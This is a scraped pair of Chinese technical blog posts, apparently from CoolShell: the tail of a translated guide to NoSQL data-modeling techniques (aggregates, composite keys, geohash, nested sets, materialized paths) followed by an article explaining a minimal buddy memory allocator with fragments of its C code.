对于关系型数据库来说，要设计这样的数据模型并不简单，而且设计出来的绝对离优雅很远很远。而我们NoSQL中灵活的Schema允许你使用一个聚合 Aggregate (product) 可以建出所有不同种类的商品和他们的不同的属性：Entity Aggregation上图中我们可以比较关系型数据库和NoSQL的差别。 **但是我们可以看到在数据更新上，非规格化的数据存储在性能和一致性上会有很大的影响，这就是我们需要重点注意和不得不牺牲的地方** 。**适用性** : Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。##### (3) 应用层联结 Application Side Joins表联结基本上不被NoSQL支持。正如我们前面所说的，NoSQL是“面向问题”而不是“面向答案”的，不支持表联结就是“面向问题”的后果。表的联结是在设计时被构造出来的，而不是在执行时建造出来的。所以，表联结在运行时是有很大开销的（陈皓注：搞过SQL表联结的都知道笛卡尔积是什么东西，大可以在参看以前酷壳的“图解数据库表Joins”），但是在使用了 Denormalization 和 Aggregates 技术后，我们基本不用进行表联结，如：你们使用嵌套式的数据实体。当然，如果你需要联结数据，你需要在应用层完成这个事。下面是几个主要的Use Case：
* 多对多的数据实体关系——经常需要被连接或联结。* 聚合 Aggregates 并不适用于数据字段经常被改变的情况。对此，我们需要把那些经常被改变的字段分到另外的表中，而在查询时我们需要联结数据。例如，我们有个Message系统可以有一个User实体，其包括了一个内嵌的Message实体。但是，如果用户不断在附加 message，那么，最好把message拆分到另一个独立的实体，但在查询时联结这User和Message这两个实体。如下图：**适用性** : Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库， Graph Databases 图数据库。#### 通用建模技术 General Modeling Techniques在本书中，我们将讨论NoSQL中各种不同的通用的数据建模技术。##### (4) 原子聚合 Atomic Aggregates很多NoSQL的数据库（并不是所有）在事务处理上都是短板。在某些情况下，他们可以通过分布式锁技术或是应用层管理的MVCC技术来实现其事务性（陈皓注：可参看本站的“多版本并发控制(MVCC)在分布式系统中的应用在分布式系统中的应用")”）但是，通常来说只能使用聚合Aggregates技术来保证一些ACID原则。
这就是为什么我们的关系型数据库需要有强大的事务处理机制——因为关系型数据库的数据是被规格化存放在了不同的地方。所以，Aggregates聚合允许我们把一个业务实体存成一个文档、存成一行，存成一个key- value，这样就可以原子式的更新了：!   Atomic Aggregates当然，原子聚合 Atomic Aggregates 这种数据模型并不能实现完全意义上的事务处理，但是如果支持原子性，锁，或 test-and-set 指令，那么， Atomic Aggregates 是可以适用的。****适用性** : **Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。##### (5) 可枚举键 Enumerable Keys也许，对于无顺序的Key- Value最大的好处是业务实体可以被容易地hash以分区在多个服务器上。而排序了的key会把事情搞复杂，但是有些时候，一个应用能从排序key中获得很多好处，就算是数据库本身不提供这个功能。让我们来思考下email消息的数据模型：1. 一些NoSQL的数据库提供原子计数器以允许生一些连续的ID。在这种情况下，我们可以使用 _userID_messageID_ 来做为一个组合key。如果我们知道最新的message ID，就可以知道前一个message，也可能知道再前面和后面的Message。   2. Messages可以被打包。比如，每天的邮件包。这样，我们就可以对邮件按指定的时间段来遍历。
******适用性** : ****Key-Value Store 键值对数据库 **。**##### (6) 降维 Dimensionality ReductionDimensionality Reduction 降维是一种技术可以允许把一个多维的数据映射成一个Key-Value或是其它非多给的数据模型。传统的地理位置信息系统使用一些如“四分树QuadTree” 或 “R-Tree” 来做地理位置索引。这些数据结构的内容需要被在适当的位置更新，并且，如果数据量很大的话，操作成本会很高。另一个方法是我们可以遍历一个二维的数据结构并把其扁平化成一个列表。一个众所周知的例子是Geohash（地理哈希）。一个Geohash使用“之字形”的路线扫描一个2维的空间，而且遍历中的移动可以被简单地用0和1来表示其方向，然后在移动的过程中产生0/1串。下图展示了这一算法：（陈皓注：先把地图分成四份，经度为第一位，纬度为第二位，于是左边的经度是0，右边的是1，纬度也一样，上面是为1，下面的为0，这样，经纬度就可以组合成01，11，00，10这四个值，其标识了四块区域，我们可以如此不断的递归地对每个区域进行四分，然后可以得到一串1和0组成的字串，然后使用0-9，b-z 去掉（去掉a, i, l, o）这32个字母进行base32编码得到一个8个长度的编码，这就是Geohash的算法）
!   Geohash IndexGeohash的最强大的功能是使用简单的位操作就可以知道两个区域间的距离，就像图中所示（陈皓：proximity框着的那两个，这个很像IP地址了）。Geohash把一个二维的坐标生生地变成了一个一维的数据模型，这就是降维技术。BigTable的降维技术参看到文章后面的 [6.1]。更多的关于Geohash和其它技术可以参看 [6.2] 和 [6.3]。******适用性** :**** Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。##### (7) 索引表 Index TableIndex Table 索引表是一个非常直白的技术，其可以你在不支持索引的数据库中得到索引的好处。BigTable是这类最重要的数据库。这需要我们维护一个有相应存取模式的特别表。例如，我们有一个主表存着用户帐号，其可以被UserID存取。某查询需要查出某个城市里所有的用户，于是我们可以加入一张表，这张表用城市做主键，所有和这个城市相关的UserID是其Value，如下所示：!   Index Table Example
可见，城市索引表的需要和对主表用户表保持一致性，因此，主表的每一个更新可能需要对索引表进行更新，不然就是一个批处理更新。无论哪个方式，这都会损伤一些性能，因为需要保持一致性。Index Table 索引表可以被认为是关系型数据库中的视图的等价物。**适用性** : BigTable 数据库。##### (8) 键组合索引 Composite Key IndexComposite key 键组合是一个很常用的技术，对此，当我们的数据库支持键排序时能得到极大的好处。Composite key组合键的拼接成为第二排序字段可以让你构建出一种多维索引，这很像我们之前说过的 Dimensionality Reduction 降维技术。例如，我们需要存取用户统计。如果我们需要根据不同的地区来统计用户的分布情况，我们可以把Key设计成这样的格式 _(State:City:UserID)_ ，这样一来，就使得我们可以通过State到City来按组遍历用户，特别是我们的NoSQL数据库支持在key上按区查询（如：BigTable类的系统）：SELECT Values WHERE state="CA:*"     SELECT Values WHERE city="CA:San Francisco*"
!   Composite Key Index****适用性** : **BigTable 数据库。##### (9) 键组合聚合 Aggregation with Composite KeysComposite keys 键组合技术并不仅仅可以用来做索引，同样可以用来区分不用的类型的数据以支持数据分组。考虑一个例子，我们有一个海量的日志数组，这个日志记录了互联网上的用户的访问来源。我们需要计算从某一网站过来的独立访客的数量，在关系型数据库中，我们可能需要下面这样的SQL查询语句：`SELECT count(distinct(user_id)) FROM clicks GROUP BY site`我们可以在NoSQL中建立如下的数据模型：!   Counting Unique Users using Composite Keys这样，我们就可以把数据按UserID来排序，我们就可以很容易把同一个用户的数据（一个用户并不会产生太多的event）进行处理，去掉那些重复的站点（使用hash table或是别的什么）。另一个可选的技术是，我们可以对每一个用户建立一个数据实体，然后把其站点来源追加到这个数据实体中，当然，这样一来，数据的更新在性能相比之下会有一定损失。
****适用性** :** Ordered Key-Value Store 排序键值对数据库， BigTable风格的数据库。**   **##### (10) 反转搜索 Inverted Search – 直接聚合 Direct Aggregation这个技术更多的是数据处理技术，而不是数据建模技术。尽管如此，这个技术还是会影响数据模型。这个技术最主要的想法是使用一个索引来找到满足某条件的数据，但是把数据聚合起需要使用全文搜索。还是让我们来说一个示例。还是用上面那个例子，我们有很多的日志，其中包括互联网用户和他们的访问来源。让我们假定每条记录都有一个UserID，还有用户的种类 (Men, Women, Bloggers, 等)，以及用户所在的城市，和访问过的站点。我们要干的事是，为每个用户种类找到满足某些条件（访问源，所在城市，等）的的独立用户。很明显，我们需要搜索那些满足条件的用户，如果我们使用反转搜索，这会让我们把这事干得很容易，如： _{Category - > [user IDs]}_ 或 _{Site - > [user IDs]}_。使用这样的索引， 我们可以取两个或多个UserID要的交集或并集（这个事很容易干，而且可以干得很快，如果这些UserID是排好序的）。但是，我们要按用户种类来生成报表会变得有点麻烦，因为我们用语句可能会像下面这样
`SELECT count(distinct(user_id)) ... GROUP BY category`但这样的SQL很没有效率，因为category数据太多了。为了应对这个问题，我们可以建立一个直接索引 _{UserID - > [Categories]}_ 然后我们用它来生成报表：!   Counting Unique Users using Inverse and Direct Indexes最后，我们需要明白，对每个UserID的随机查询是很没有效率的。我们可以通过批查询处理来解决这个问题。这意味着，对于一些用户集，我们可以进行预处理（不同的查询条件）。**适用性** : Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。#### 层级式模型 Hierarchy Modeling Techniques##### (11) 树形聚合Tree Aggregation树形或是任意的图（需反规格化）可以被直接打成一条记录或文档存放。* 当树形结构被一次性取出时这会非常有效率（如：我们需要展示一个blog的树形评论）   * 搜索和任何存取这个实体都会存在问题。   * 对于大多数NoSQL的实现来说，更新数据都是很不经济的（相比起独立结点来说）
!   Tree Aggregation**适用性** : Key-Value 键值对数据库, Document Databases 文档数据库##### (12) 邻接列表 Adjacency ListsAdjacency Lists 邻接列表是一种图 – 每一个结点都是一个独立的记录，其包含了 所有的父结点或子结点。这样，我们就可以通过给定的父或子结点来进行搜索。当然，我们需要通过hop查询遍历图。这个技术在广度和深度查询，以及得到某个结点的子树上没有效率。**适用性** : Key-Value 键值对数据库, Document Databases 文档数据库**   **##### (13) Materialized PathsMaterialized Paths 可以帮助避免递归遍历（如：树形结构）。这个技术也可以被认为是反规格化的一种变种。其想法是为每个结点加上父结点或子结点的标识属性，这样就可以不需要遍历就知道所有的后裔结点和祖先结点了：!   Materialized Paths for eShop Category Hierarchy这个技术对于全文搜索引擎来说非常有帮助，因为其可以允许把一个层级结构转成一个文档。上面的示图中我们可以看到所有的商品或 _Men’s Shoes_ 下的子分类可以被一条很短的查询语句处理——只需要给定个分类名。
Materialized Paths 可以存储一个ID的集合，或是一堆ID拼出的字符串。后者允许你通过一个正则表达式来搜索一个特定的分支路径。下图展示了这个技术（分支的路径包括了结点本身）：!   Query Materialized Paths using RegExp**适用性** : Key-Value 键值对数据库, Document Databases 文档数据, Search Engines 搜索引擎##### (14) 嵌套集 Nested SetsNested sets 嵌套集是树形结构的标准技术。它被广泛地用在了关系性数据库中，它完全地适用于 Key-Value 键值对数据库 和 Document Databases 文档数据库。这个技术的想法是把叶子结点存储成一个数组，并通过使用索引的开始和结束来映射每一个非叶子结点到一个叶子结点集，就如下图所示一样：!   Modeling of eCommerce Catalog using Nested Sets这样的数据结构对于immutable data不变的数据 有非常不错的效率，因为其点内存空间小，并且可以很快地找出所有的叶子结点而不需要树的遍历。尽管如此，在插入和更新上需要很高的性能成本，因为新的叶子结点需要大规模地更新索引。
**适用性** : Key-Value Stores 键值数据库, Document Databases 文档数据库#### (15) 嵌套文档扁平化：有限的字段名 Nested Documents Flattening: Numbered Field Names搜索引擎基本上来说和扁平文档一同工作，如：每一个文档是一个扁平的字段和值的例表。这种数据模型的用来把业务实体映射到一个文本文档上，如果你的业务实体有很复杂的内部结构，这可能会变得很有挑战。一个典型的挑战是把一个有层级的文档映映射出来。例如，文档中嵌套另一个文档。让我们看看下面的示例：!   Nested Documents Problem上面的每一个业务实体代码一种简历。其包括了人名和一个技能列表。我把这个层级文档映射成一个文本文档，一种方法是创建 _Skill_ 和 _Level_ 字段。这个模型可以通过技术或是等级来搜索一个人，而上图标注的那样的组合查询则会失败。（陈皓注：因为分不清Excellent是否是Math还是Poetry上的）在引用中的 [4.6] 给出了一种解决方案。其为每个字段都标上数字 _Skill_i_ 和 _Level_i_ ，这样就可以分开搜索每一个对（下图中使用了OR来遍历查找所有可能的字段）:
!   Nested Document Modeling using Numbered Field Names这样的方式根本没有扩展性，对于一些复杂的问题来说只会让代码复杂度和维护工作变大。**适用性** : Search Engines 全文搜索##### (16)嵌套文档扁平化：邻近查询 Nested Documents Flattening: Proximity Queries在附录 [4.6]中给出了这个技术用来解决扁平层次文档。它用邻近的查询来限制可被查询的单词的范围。下图中，所有的技能和等级被放在一个字段中，叫 SkillAndLevel，查询中出现的 “Excellent” 和 “Poetry” 必需一个紧跟另一个：!   Nested Document Modeling using Proximity Queries附录 [4.3] 中讲述了这个技术被用在Solr中的一个成功案例。**适用性** : Search Engines 全文搜索##### (17) 图结构批处理 Batch Graph ProcessingGraph databases 图数据库，如 neo4j 是一个出众的图数据库，尤其是使用一个结点来探索邻居结点，或是探索两个或少量结点前的关系。但是处理大量的图数据是很没有效率的，因为图数据库的性能和扩展性并不是其目的。分布式的图数据处理可以被 MapReduce 和 Message Passing pattern 来处理。如： 在我前一篇的文章中的那个示例。这个方法可以让 Key-Value stores, Document databases, 和 BigTable-style databases 适合于处理大图。
**Applicability** : Key-Value Stores, Document Databases, BigTable-style Databases#### 参考Finally, I provide a list of useful links related to NoSQL data modeling:1. Key-Value Stores:      1.      2. http://antirez.com/post/Sorting-in-key-value-data-model.html     3.      4. http://dbmsmusings.blogspot.com/2010/03/distinguishing-two-major-types-of_29.html   2. BigTable-style Databases:      1.      2.      3.      4.      5.    3. Document Databases:      1.      2.      3.      4.      5.      6.    4. Full Text Search Engines:      1.      2.      3.      4.      5.      6.      7.      8. http://sujitpal.blogspot.com/2010/10/denormalizing-maps-with-lucene-payloads.html     9.    5. Graph Databases:      1.      2.      3.      4. http://www.umiacs.umd.edu/~jimmylin/publications/Lin_Schatz_MLG2010.pdf   6. Demensionality Reduction:      1.      2.      3.
（全文完）# 伙伴分配器的一个极简实现作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友** **@我的上铺叫路遥** **投稿）**提起buddy system相信很多人不会陌生，它是一种经典的内存分配算法，大名鼎鼎的Linux底层的内存管理用的就是它。这里不探讨内核这么复杂实现，而仅仅是将该算法抽象提取出来，同时给出一份及其简洁的源码实现，以便定制扩展。伙伴分配的实质就是一种特殊的 **“分离适配”** ，即将内存按2的幂进行划分，相当于分离出若干个块大小一致的空闲链表，搜索该链表并给出同需求最佳匹配的大小。其优点是快速搜索合并（O(logN)时间复杂度）以及低外部碎片（最佳适配best- fit）；其缺点是内部碎片，因为按2的幂划分块，如果碰上66单位大小，那么必须划分128单位大小的块。但若需求本身就按2的幂分配，比如可以先分配若干个内存池，在其基础上进一步细分就很有吸引力了。可以在维基百科上找到该算法的描述，大体如是：**分配内存：**1.寻找大小合适的内存块（大于等于所需大小并且最接近2的幂，比如需要27，实际分配32）
1.如果找到了，分配给应用程序。   2.如果没找到，分出合适的内存块。1.对半分离出高于所需大小的空闲内存块   2.如果分到最低限度，分配这个大小。   3.回溯到步骤1（寻找合适大小的块）   4.重复该步骤直到一个合适的块**释放内存：**1.释放该内存块1.寻找相邻的块，看其是否释放了。   2.如果相邻块也释放了，合并这两个块，重复上述步骤直到遇上未释放的相邻块，或者达到最高上限（即所有内存都释放了）。上面这段文字对你来说可能看起来很费劲，没事，我们看个内存分配和释放的示意图你就知道了：上图中，首先我们假设我们一个内存块有1024K，当我们需要给A分配70K内存的时候，1. 我们发现1024K的一半大于70K，然后我们就把1024K的内存分成两半，一半512K。   2. 然后我们发现512K的一半仍然大于70K，于是我们再把512K的内存再分成两半，一半是128K。   3. 此时，我们发现128K的一半小于70K，于是我们就分配为A分配128K的内存。后面的，B，C，D都这样，而释放内存时，则会把相邻的块一步一步地合并起来（合并也必需按分裂的逆操作进行合并）。我们可以看见，这样的算法，用二叉树这个数据结构来实现再合适不过了。
我在网上分别找到cloudwu和wuwenbin写的两份开源实现和测试用例。实际上后一份是对前一份的精简和优化，本文打算从后一份入手讲解， **因为这份实现真正体现了“极简”二字，追求突破常规的，极致简单的设计。** 网友对其评价甚高，甚至可用作教科书标准实现，看完之后回过头来看cloudwu的代码就容易理解了。分配器的整体思想是，通过一个数组形式的完全二叉树来监控管理内存，二叉树的节点用于标记相应内存块的使用状态，高层节点对应大的块，低层节点对应小的块，在分配和释放中我们就通过这些节点的标记属性来进行块的分离合并。如图所示，假设总大小为16单位的内存，我们就建立一个深度为5的满二叉树，根节点从数组下标[0]开始，监控大小16的块；它的左右孩子节点下标[1~2]，监控大小8的块；第三层节点下标[3~6]监控大小4的块……依此类推。在分配阶段，首先要搜索大小适配的块，假设第一次分配3，转换成2的幂是4，我们先要对整个内存进行对半切割，从16切割到4需要两步，那么从下标[0]节点开始深度搜索到下标[3]的节点并将其标记为已分配。第二次再分配3那么就标记下标[4]的节点。第三次分配6，即大小为8，那么搜索下标[2]的节点，因为下标[1]所对应的块被下标[3~4]占用了。
在释放阶段，我们依次释放上述第一次和第二次分配的块，即先释放[3]再释放[4]，当释放下标[4]节点后，我们发现之前释放的[3]是相邻的，于是我们立马将这两个节点进行合并，这样一来下次分配大小8的时候，我们就可以搜索到下标[1]适配了。若进一步释放下标[2]，同[1]合并后整个内存就回归到初始状态。还是看一下源码实现吧，首先是伙伴分配器的数据结构：这里的成员size表明管理内存的总单元数目（测试用例中是32），成员longest就是二叉树的节点标记，表明所对应的内存块的空闲单位， **在下文中会分析这是整个算法中最精妙的设计。** 此处数组大小为1表明这是可以向后扩展的（注：在GCC环境下你可以写成longest[0]，不占用空间，这里是出于可移植性考虑），我们在分配器初始化的buddy2_new可以看到这种用法。if (size < 1 || !IS_POWER_OF_2(size))     return NULL;self = (struct buddy2*)ALLOC( 2 * size * sizeof(unsigned));     self->size = size;     node_size = size * 2;
整个分配器的大小就是满二叉树节点数目，即所需管理内存单元数目的2倍。一个节点对应4个字节，longest记录了节点所对应的的内存块大小。内存分配的alloc中，入参是分配器指针和需要分配的大小，返回值是内存块索引。alloc函数首先将size调整到2的幂大小，并检查是否超过最大限度。然后进行适配搜索，深度优先遍历，当找到对应节点后， **将其longest标记为0，即分离适配的块出来，** 并转换为内存块索引offset返回，依据二叉树排列序号，比如内存总体大小32，我们找到节点下标[8]，内存块对应大小是4，则offset = (8+1)*4-32 = 4，那么分配内存块就从索引4开始往后4个单位。if (self==NULL)     return -1;if (size <= 0)     size = 1;     else if (!IS_POWER_OF_2(size))     size = fixsize(size);if (self->longest[index] < size)     return -1;self->longest[index] = 0;     offset = (index + 1) * node_size - self->size;
return offset;     }在函数返回之前需要回溯，因为小块内存被占用，大块就不能分配了，比如下标[8]标记为0分离出来，那么其父节点下标[0]、[1]、[3]也需要相应大小的分离。 **将它们的longest进行折扣计算，取左右子树较大值，** 下标[3]取4，下标[1]取8，下标[0]取16，表明其对应的最大空闲值。在内存释放的free接口，我们只要传入之前分配的内存地址索引，并确保它是有效值。之后就跟alloc做反向回溯，从最后的节点开始一直往上找到longest为0的节点，即当初分配块所适配的大小和位置。 **我们将longest恢复到原来满状态的值。继续向上回溯，检查是否存在合并的块，依据就是左右子树longest的值相加是否等于原空闲块满状态的大小，如果能够合并，就将父节点longest标记为相加的和** （多么简单！）。assert(self && offset >= 0 && offset < size);node_size = 1;     index = offset + self->size - 1;self->longest[index] = node_size;
left_longest = self->longest[LEFT_LEAF(index)];     right_longest = self->longest[RIGHT_LEAF(index)];if (left_longest + right_longest == node_size)     self->longest[index] = node_size;     else     self->longest[index] = MAX(left_longest, right_longest);     }     }上面两个成对alloc/free接口的时间复杂度都是O(logN)，保证了程序运行性能。然而这段程序设计的独特之处就在于 **使用加权来标记内存空闲状态，而不是一般的有限状态机，实际上longest既可以表示权重又可以表示状态，状态机就毫无必要了，所谓“少即是多”嘛！** 反观cloudwu的实现，将节点标记为UNUSED/USED/SPLIT/FULL四个状态机，反而会带来额外的条件判断和管理实现，而且还不如数值那样精确。从逻辑流程上看，wuwenbin的实现简洁明了如同教科书一般，特别是左右子树的走向，内存块的分离合并，块索引到节点下标的转换都是一步到位，不像cloudwu充斥了大量二叉树的深度和长度的间接计算，让代码变得晦涩难读，这些都是longest的功劳。 **一个“极简”的设计往往在于你想不到的突破常规思维的地方。**
